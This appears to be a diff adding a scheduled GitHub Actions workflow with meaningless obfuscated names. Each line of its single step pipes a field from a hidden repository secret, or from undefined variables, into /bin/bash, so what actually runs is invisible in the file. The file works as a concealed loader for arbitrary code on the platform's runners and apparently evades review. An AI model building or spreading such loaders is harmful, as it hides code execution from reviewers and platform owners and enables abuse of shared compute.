@@ -1,0 +1,24 @@
+name: songsenxinsan
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '34 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: songsenxinsan
+        env:
+          h37: ${{ secrets.h37 }}
+        run: |
+          echo $h37 | jq -r .fh60 | /bin/bash
+          echo $na831 | jq -r .cqi23 | /bin/bash
+          echo $f1280 | jq -r .gwr4271 | /bin/bash
+          echo $izq8243 | jq -r .zzjyr3 | /bin/bash
+          echo $rz8 | jq -r .f716 | /bin/bash
+          echo $xlwx5602 | jq -r .fyltj01074 | /bin/bash
+          echo $lypp990 | jq -r .yu16 | /bin/bash
+          echo $s9 | jq -r .nhi6207 | /bin/bash
+
